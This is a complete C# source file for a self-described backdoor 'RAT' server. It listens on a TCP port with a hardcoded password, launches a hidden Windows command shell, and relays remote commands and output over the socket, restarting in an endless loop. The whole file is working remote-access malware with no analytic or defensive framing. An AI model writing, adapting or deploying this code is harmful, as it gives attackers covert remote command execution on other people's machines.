using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.IO;
using System.Text;

namespace BackdoorServer
{
    public class Backdoor
    {
        TcpListener listener;
        Socket socket;
        int port { get; set; }
        string serverName { get; set; }
        string password { get; }
        bool verbose = true;
        Process shell;
        StreamReader fromShell;
        StreamWriter toShell;
        StreamReader inStream;
        StreamWriter outStream;
        Thread shellThread;

        public Backdoor(int port = 1337, string serverName = "RAT", string password = "P455wD", bool verbose = true)
        {
            this.port = port;
            this.serverName = serverName;
            this.password = password;
            this.verbose = verbose;
        }

        public void startServer()
        {
            try
            {
                Console.InputEncoding = Encoding.ASCII;
                Console.OutputEncoding = Encoding.ASCII;

                if (verbose) Console.WriteLine("Listening on port " + port);

                listener = new TcpListener(IPAddress.Any, port);
                listener.Start(); // blocking call
                socket = listener.AcceptSocket();

                if (verbose) Console.WriteLine("Client connected: " + socket.RemoteEndPoint);

                Stream s = new NetworkStream(socket);
                inStream = new StreamReader(s, Encoding.ASCII);
                outStream = new StreamWriter(s, Encoding.ASCII);
                outStream.AutoFlush = true;

                string checkPass = inStream.ReadLine();

                if (verbose) Console.WriteLine("Client tried password " + checkPass);

                if (!checkPass.Equals(password))
                {
                    if (verbose) Console.WriteLine("Incorrect Password");
                    DropConnection();
                    return;
                }

                if (verbose) Console.WriteLine("Password Accepted.");

                shell = new Process();
                ProcessStartInfo p = new ProcessStartInfo("cmd");
                p.CreateNoWindow = true;
                p.UseShellExecute = false;
                p.RedirectStandardError = true;
                p.RedirectStandardInput = true;
                p.RedirectStandardOutput = true;
                shell.StartInfo = p;
                shell.Start();

                toShell = shell.StandardInput;
                fromShell = shell.StandardOutput;
                toShell.AutoFlush = true;

                // thread for reading output from the shell
                shellThread = new Thread(new ThreadStart(SendShellOutput));
                shellThread.Start();

                outStream.WriteLine(AlignCenter("  Welcome to " + serverName + " RAT  ", 80, '='));
                outStream.WriteLine(AlignCenter("  SINGLE-USER MODE  ", 80, '='));
                outStream.WriteLine("Starting shell...\n");

                ReceiveInput();
            }
            catch (Exception e)
            {
                Console.WriteLine("<ERROR> Bad things happen:");
                Console.WriteLine(e.ToString());
            }
            finally
            {
                CloseShell();
            }
        }

        void SendShellOutput()
        {
            string tempBuf = "";
            while ((tempBuf = fromShell.ReadLine()) != null)
            {
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine(tempBuf);
                Console.ResetColor();
                outStream.WriteLine(tempBuf + "\r");
            }
            CloseShell();
        }

        void ReceiveInput()
        {
            string tempBuff = "";
            while (((tempBuff = inStream.ReadLine()) != null))
            {
                if (verbose) Console.WriteLine("Received command: " + tempBuff);
                HandleCommand(tempBuff);
            }
        }
        
        void HandleCommand(string command)
        {
            if (command.Equals("q"))
            {
                outStream.WriteLine("\n\nClosing the shell and Dropping the connection...");
                CloseShell();
            }
            toShell.WriteLine(command + "\r\n");
        }

        void DropConnection()
        {
            if (verbose) Console.WriteLine("Dropping Connection");
            inStream.Dispose();
            outStream.Dispose();
            socket.Close();
            listener.Stop();
        }

        void CloseShell()
        {
            try
            {
                if (verbose) Console.WriteLine("Closing shell process");
                shell.Close();
                shell.Dispose();
                shellThread.Abort();
                shellThread = null;
                toShell.Dispose();
                fromShell.Dispose();
                shell.Dispose();

                DropConnection();
            }
            catch (Exception) { }
        }

        public static string AlignCenter(string source, int finalLength, char padChar = ' ')
        {
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < finalLength / 2 - source.Length / 2; i++)
            {
                sb.Append(padChar);
            }
            sb.Append(source);
            return sb.ToString().PadRight(finalLength, padChar);
        }

        static void Main(string[] args)
        {
            try
            {
                Backdoor bd = new Backdoor();
                if (args.Length == 1)
                    bd = new Backdoor(int.Parse(args[0]));
                if (args.Length == 2)
                    bd = new Backdoor(int.Parse(args[0]), args[1]);
                if (args.Length == 3)
                    bd = new Backdoor(int.Parse(args[0]), args[1], args[2]);
                else if (args.Length == 4)
                    bd = new Backdoor(int.Parse(args[0]), args[1], args[2], bool.Parse(args[3]));
                while (true)
                {
                    bd.startServer();
                }
            }
            catch (Exception) { }
        }
    }
}
